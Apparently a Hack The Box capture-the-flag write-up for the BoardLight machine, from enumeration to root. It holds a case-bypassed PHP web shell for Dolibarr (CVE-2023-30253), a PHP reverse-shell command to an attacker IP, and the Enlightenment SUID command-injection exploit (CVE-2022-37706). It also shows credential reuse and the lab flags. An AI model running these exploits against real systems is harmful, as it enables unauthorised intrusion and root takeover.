# HTB - Boardlight- 10.129.231.37

## BoardLight - 10.129.231.37

### Nmap

```
nmap -p- --min-rate 5000 -vvv -Pn -sCV 10.129.231.37 -oN enumeration.tcp
```

| Port | Service | Version                          |
| ---- | ------- | -------------------------------- |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 80   | HTTP    | Apache 2.4.41 (Ubuntu)           |

OS: Ubuntu 20.04 focal

***

### Web - TCP 80

* Static site for a cybersecurity company (PHP-based)
* Pages: index.php, about.php, do.php, contact.php
* Contact form doesn't submit anywhere
* Email in footer: `info@board.htb` → domain: **board.htb**

#### Directory Brute Force

```
feroxbuster -u http://10.129.231.37 -w /usr/share/wordlists/dirb/common.txt -x php,html --depth 3
```

* Nothing beyond known pages and standard dirs (/css, /images, /js)

#### Vhost Enumeration

Initial attempt with `boardlight.htb` → nothing (wrong domain).

Correct domain found via email in footer: `board.htb`

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u 'http://board.htb' -H 'Host: FUZZ.board.htb' -fs 15949
```

**Found:** `crm.board.htb` \[Status: 200, Size: 6360]

#### Other checks

* `.git/config` → 404

***

### crm.board.htb - Dolibarr 17.0.0

* Login page for Dolibarr ERP/CRM
* Version: **17.0.0** (shown above login form)
* Default creds: `admin:admin` → login successful (non-admin user)

#### CVE-2023-30253 - PHP Code Injection

Dolibarr before 17.0.1 blocks `<?php` in page content, but the filter is **case-sensitive**. Using `<?PHP` or `<?Php` bypasses the restriction → RCE as www-data.

**Attempted automated exploit:**

```
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.15.59 9999
```

Script failed with `AttributeError: 'NoneType' object has no attribute 'get_text'` — page structure mismatch.

**Manual exploitation:**

1. Logged into Dolibarr as `admin:admin`
2. Created website "rce" → created page "rce"
3. Edited HTML source, injected: `<?Php system($_GET['cmd']); ?>`
4. Enabled "Show dynamic content"
5. Triggered reverse shell via URL:

```
http://crm.board.htb/public/website/index.php?website=rce&pageref=rce&cmd=php -r '$sock=fsockopen("10.10.15.59",9999);exec("/bin/bash <&3 >&3 2>&3");'
```

**Shell received as www-data**

***

### Privesc: www-data → larissa

#### Dolibarr Config File

```
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

Database credentials found:

* DB user: `dolibarrowner`
* DB pass: `serverfun2$2023!!`
* DB name: `dolibarr`
* DB host: `localhost:3306`

Also found in `nightwatch.conf.js`: default admin creds `admin:admin` (already known).

#### Password Reuse

Tried DB password against system users:

```
su larissa   → serverfun2$2023!! → SUCCESS
su root      → serverfun2$2023!! → FAIL
```

**user.txt:** `363a48b2678bd88599137653ec7dc532`

***

### Privesc: larissa → root

#### Enumeration

* `sudo -l` → no sudo privileges
* `/proc` mounted with `hidepid=invisible` (can't see other users' processes)
* Home directory has Desktop/Downloads/etc → GUI desktop environment installed

#### SUID Binaries

```
find / -perm -4000 2>/dev/null
```

Unusual SUID binaries found — **Enlightenment window manager v0.23.1:**

```
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
```

#### CVE-2022-37706 - Enlightenment Command Injection

`enlightenment_sys` is SUID root and passes user-controlled paths to `system()`. A crafted mount path with a semicolon causes command injection.

**Exploitation:**

```bash
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o \
  noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \
  "/dev/../tmp/;/tmp/exploit" /tmp///net
```

Shell drops into `/bin/sh` as root (no visible prompt — don't Ctrl+C).

**Note:** Manual execution worked but stdout was unreliable. Used PoC script (`exploit.sh`) which worked cleanly. Lesson: when shell has no prompt, run `id` first and don't kill it with Ctrl+C.

**root.txt:** `9a0109b0696fa93d9fb2fa086c6bd2b2`

***

### Tags

`#dolibarr` `#cve-2023-30253` `#php-injection` `#case-sensitive-bypass` `#password-reuse` `#suid` `#enlightenment` `#cve-2022-37706` `#command-injection` `#oscp-like`
